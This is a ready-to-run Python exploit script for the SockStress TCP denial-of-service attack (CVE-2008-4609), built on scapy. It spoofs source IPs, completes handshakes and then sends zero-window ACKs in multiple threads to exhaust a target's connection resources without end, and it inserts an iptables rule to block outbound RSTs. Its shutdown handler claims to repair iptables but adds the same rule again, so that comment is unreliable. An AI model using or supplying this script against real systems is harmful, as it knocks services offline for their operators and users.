#!/usr/bin/python

# Exploit Title: SockStress DoS
# Date: July 4, 2014
# Exploit Author: Justin Hutchens 
# LinkedIn: www.linkedin.com/in/justinhutchens
# Twitter: @pan0pt1c0n
# Tested on: Kali Linux x64
# CVE : CVE-2008-4609

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
import thread
import os
import signal
import sys

print "\n*******************************************************"
print "**  Python Sock Stress DoS                           **"
print "**  by Pan0pt1c0n (Justin Hutchens)                 **"
print "**  BREAK ALL THE SERVERS!!!                         **"
print "*******************************************************\n\n"

if len(sys.argv) < 3:
	print "Usage - ./sock_stress.py [Target-IP] [Port Number Separated b commas]"
	print "Example - ./sock_stress.py 10.0.0.5 21 20"
	print "Example will perform a 20x multi-threaded sock-stress DoS attack "
	print "against the FTP (port 21) service on 10.0.0.5"
	print "\n***NOTE***" 
	print "Make sure you target a port that responds when a connection is made"
	sys.exit()

target = str(sys.argv[1])
ports = sys.argv[2].split(',')
threads = 4

## This is where the magic happens
def sockstress(start,target,ports):
	for i in range(start,255):
	    for j in range(0,255):
	        try:
	            ipaddr = "192.168."+str(i)+"."+str(j)
	            x = random.randint(0,65535)
	            for port in ports:
	                port = int(port)
	                response = sr1(IP(src=ipaddr,dst=target)/TCP(sport=x,dport=port,flags='S'),timeout=1,verbose=0)
	                send(IP(src=ipaddr,dst=target)/TCP(dport=port,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
	        except:
	            pass

## Graceful shutdown allows IP Table Repair
def graceful_shutdown(signal, frame):
	print '\nYou pressed Ctrl+C!'
	print 'Fixing IP Tables'
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
	sys.exit()

## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)

## Spin up multiple threads to launch the attack
print "The onslaught has begun...use Ctrl+C to stop the attack"
increment = 255/threads
offset = 0
for x in range(0,threads):
	thread.start_new_thread(sockstress, (x+offset,target,ports))
	offset += increment

## Make it go FOREVER (...or at least until Ctrl+C)
while 0 == 0:
	sleep(0)
